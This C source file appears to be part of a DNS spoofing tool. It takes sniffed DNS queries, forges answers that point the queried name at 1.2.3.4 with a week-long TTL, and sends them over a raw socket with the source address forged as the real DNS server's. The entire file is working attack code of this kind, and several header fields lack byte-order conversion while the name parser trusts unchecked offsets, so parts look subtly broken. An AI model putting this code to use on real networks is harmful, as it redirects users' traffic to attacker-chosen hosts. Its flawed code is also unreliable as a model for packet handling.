#include<stdio.h> //for printf
#include<string.h> //memset
#include<sys/socket.h>    //for socket ofcourse
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/udp.h>   //Provides declarations for udp header
#include<netinet/ip.h>    //Provides declarations for ip header
#include "dns.h"
/* 
    96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/
struct pseudo_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
};
 
/*
    Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

char name[256];
char rdata[256];

unsigned char* ReadName(unsigned char* reader,unsigned char* buffer,int* count)
{
    unsigned int p=0,jumped=0,offset;
    int i , j;
 
    *count = 1;
 
    name[0]='\0';
 
    /* read the names in 3www6google3com format */
    while(*reader!=0)
    {
        if(*reader>=192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152; /* 49152 = 11000000 00000000 ;) */
            reader = buffer + offset - 1;
            jumped = 1; /*we have jumped to another location so counting wont go up! */
        }
        else
        {
            name[p++]=*reader;
        }
 
        reader=reader+1;
 
        if(jumped==0) *count = *count + 1; /* if we havent jumped to another location then we can count up */
    }
 
    name[p]='\0'; /* string complete */
    if(jumped==1) 
    {
        *count = *count + 1; /* number of steps we actually moved forward in the packet */
    }
 
    /* now convert 3www6google3com0 to www.google.com */
    for(i=0;i<(int)strlen((const char*)name);i++)
    {
        p=name[i];
        for(j=0;j<(int)p;j++)
        {
            name[i]=name[i+1];
            i=i+1;
        }
        name[i]='.';
    }
     
    name[i-1]='\0'; /* remove the last dot */
     
    return name;
}

int send_dns_resp(unsigned char *pkt, int len, unsigned int saddr, unsigned int daddr, unsigned short sport)
{
    int psize;
    char datagram[1500], *pseudogram;
    struct iphdr *iph;
    struct udphdr *udph;
    struct sockaddr_in sin;
    struct pseudo_header psh;

    print_payload(pkt, len);
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(s==-1)
    {
	printf("failed to create raw socket.\n");
	return -1;
    }

    memset(datagram, 0, sizeof(datagram));
    iph = (struct iphdr *)datagram;
    udph = (struct udphdr *)(datagram + sizeof(struct ip));
    memcpy(datagram + sizeof(struct iphdr) + sizeof(struct udphdr), pkt, len);

    sin.sin_family = AF_INET;
    sin.sin_port = sport;
    sin.sin_addr.s_addr = saddr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + len;
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = daddr;
    iph->daddr = saddr;

    iph->check = csum((unsigned short *)datagram, iph->tot_len);

    udph->uh_sport = 53;
    udph->uh_dport = sport;
    udph->uh_ulen = (8 + len);
    udph->uh_sum = 0;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = sizeof(struct udphdr) + len;

    psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + len;
    pseudogram = malloc(psize);
    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr)+len);
    
    udph->uh_sum = csum((unsigned short*)pseudogram, psize);

    if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin))<0)
    {
	printf("failed to sendto!\n");
    }
    else
    {
	printf("packet sent! length : %d\n", iph->tot_len);
    }

    free(pseudogram);
    close(s);

    return 1;
}

int dns_sniff(unsigned char *pkt, int len, unsigned int saddr, unsigned int daddr, unsigned short sport)
{
    char buffer[1024];
    
    struct DNS_HEADER *dns = (struct DNS_HEADER *)pkt;
    struct RES_RECORD reqs;
    struct R_DATA *rd;
    struct sockaddr_in a;
    char *qname = (char *)(dns+1);
    unsigned char *reader;
    int i, j, pushed=0, stop, mod=0;
    int spoof_idx = 0;

    printf("\nThe Requesst contains: ");
    printf("\n Transaction ID: %x\n", dns->id);
    printf("\n %d Questions.", dns->q_count);
    printf("\n %d Reqs.", dns->ans_count);
    printf("\n %d Authoritative Servers.", dns->auth_count); 
    printf("\n %d Additional records.\n\n", dns->add_count);
    printf("\n Question is %s\n", qname);
    printf("\n\n");

    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, pkt, len);

    *(short *)(buffer + len) = 0xc00c;
    
    rd = (struct R_DATA*)(buffer + len + 2);
    rd->type = 1;
    rd->_class = 1;
    rd->ttl = 604800;
    rd->data_len = 4;

    dns = (struct DNS_HEADER *)buffer;
    dns->ans_count = 1;
    dns->rd = 1;

    *(unsigned int *)(buffer + len + 2 + sizeof(struct R_DATA)) = inet_addr("1.2.3.4");

    return send_dns_resp(buffer, len + 2 + sizeof(struct R_DATA) + 4, saddr, daddr, sport);
}

